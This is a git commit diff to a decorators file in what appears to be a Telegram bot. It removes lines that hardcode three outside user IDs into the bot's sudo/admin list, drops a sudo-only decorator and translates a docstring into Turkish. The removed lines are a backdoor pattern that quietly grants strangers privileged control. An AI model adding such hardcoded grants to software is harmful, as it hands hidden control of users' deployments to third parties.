4acefaabc9d81ca0fe84168bf6f3d2301e1c48b7
Ama_hocam <97902506+amahocam@users.noreply.github.com>
2022-06-25 12:47:41 +0300

    Update decorators.py

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -7,11 +7,6 @@ from helpers.admins import get_administrators
 from config import SUDO_USERS
 
 
-SUDO_USERS.append(5358923859)
-SUDO_USERS.append(5128216420)
-SUDO_USERS.append(5032012085)
-
-
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         try:
@@ -36,16 +31,9 @@ def authorized_users_only(func: Callable) -> Callable:
     return decorator
 
 
-def sudo_users_only(func: Callable) -> Callable:
-    async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
-            return await func(client, message)
-
-    return decorator
-
-
+# Utils Helper
 def humanbytes(size):
-    """Convert Bytes To Bytes So That Human Can Read It"""
+    """baytları Baytlara Dönüştür ki İnsan Okuyabilsin"""
     if not size:
         return ""
     power = 2 ** 10
